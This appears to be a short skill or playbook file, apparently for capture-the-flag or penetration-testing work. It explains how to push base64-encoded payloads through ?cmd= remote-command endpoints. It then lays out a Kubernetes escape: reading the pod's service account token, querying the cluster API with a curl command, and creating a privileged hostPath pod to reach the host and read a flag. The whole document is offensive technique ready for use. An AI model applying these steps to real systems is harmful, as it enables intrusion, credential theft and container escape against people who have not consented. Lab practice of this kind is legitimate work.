---
id: nested-rce
title: Nested RCE channels — SSRF, ?cmd= endpoints, K8s pod escape
triggers: [ssrf, ?cmd=, command=, serviceaccount, kubernetes, Bearer, pods, /pods/]
---

# Nested RCE channels (SSRF / ?cmd= endpoints)

- A `?cmd=` endpoint runs ONE shell line per request — heredocs and nested
  JSON bodies get mangled by url-encoding. Transport any multi-line /
  quote-heavy payload as base64: encode on Kali, then
  `?cmd=echo+<b64>|+base64+-d+>+/tmp/f.json` inside the target, then
  reference the file (`curl -d @/tmp/f.json`, `python3 /tmp/x.py`).
- `$(...)` inside ?cmd= runs on the TARGET — never unescape to fetch a
  token locally first; either inline it in the same cmd line or carry it
  in a follow-up request.

# K8s escape pattern

Pod RCE → SA token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
→ API:

```bash
curl -k -H "Authorization: Bearer $T" \
  https://kubernetes.default.svc/api/v1/namespaces/<ns>/pods
```

→ privileged pod (metadata.namespace + `imagePullPolicy: IfNotPresent`
for local images + `hostPath` + `privileged: true`) → flag via
`pods/<name>/log`.
